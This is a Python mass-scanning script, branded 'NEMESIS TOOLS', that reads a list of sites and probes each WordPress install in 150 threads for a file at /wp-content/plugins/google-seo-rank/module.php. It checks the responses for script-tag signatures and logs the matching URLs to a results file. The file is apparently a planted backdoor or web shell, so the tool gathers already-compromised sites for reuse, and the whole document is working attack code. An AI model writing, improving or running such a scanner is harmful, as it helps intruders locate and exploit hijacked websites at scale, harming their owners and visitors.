# -*- coding: utf-8 -*-

import sys
import requests
import re
from multiprocessing.dummy import Pool
from colorama import Fore, init

init(autoreset=True)

# Color definitions
fr = Fore.RED
fg = Fore.GREEN
fw = Fore.WHITE

# Banners
requests.urllib3.disable_warnings()
banner = ''' 

NEMESIS TOOLS

'''

print(fg + banner + Fore.WHITE)

# Try to read the target file, handle exception if no file is provided
try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit(f'\n  [!] Enter <{path[-1]}> <sites.txt>')

Pathlist = ['themes.php', 'admin.php']

class BADSVIP:
    def __init__(self):
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36'
        }

    def URLdomain(self, site):
        if site.startswith("http://"):
            site = site.replace("http://", "")
        elif site.startswith("https://"):
            site = site.replace("https://", "")
        
        # Remove trailing path components
        pattern = re.compile(r'(.*)/')
        while re.findall(pattern, site):
            sitez = re.findall(pattern, site)
            site = sitez[0]
        return site

    def BADSVIP_F(self, site):
        try:
            url = "http://" + self.URLdomain(site)
            response = requests.get(url + '/wp-content/plugins/google-seo-rank/module.php', headers=self.headers, verify=False, timeout=25)
            content = response.content.decode('utf-8')
            if any(x in content[:150] for x in ["<script>//", "<script>/*_", "<script>/*", "--><script><!"]):
                print(f' NEMESIS TOOLS : {url} --> {fg}[Successfully]')
                with open('Results/module.txt', 'a') as f:
                    f.write(url + "/wp-content/plugins/google-seo-rank/module.php\n")
            else:
                print(f' NEMESIS TOOLS : {url} --> {fr}[Failed]')
        except Exception as e:
            print(f' NEMESIS TOOLS : {url} --> {fr}[Not Found]')


Control = BADSVIP()

def BADS(site):
    try:
        Control.BADSVIP_F(site)
    except :
        pass

mp = Pool(150)
mp.map(BADS, target)
mp.close()
mp.join()
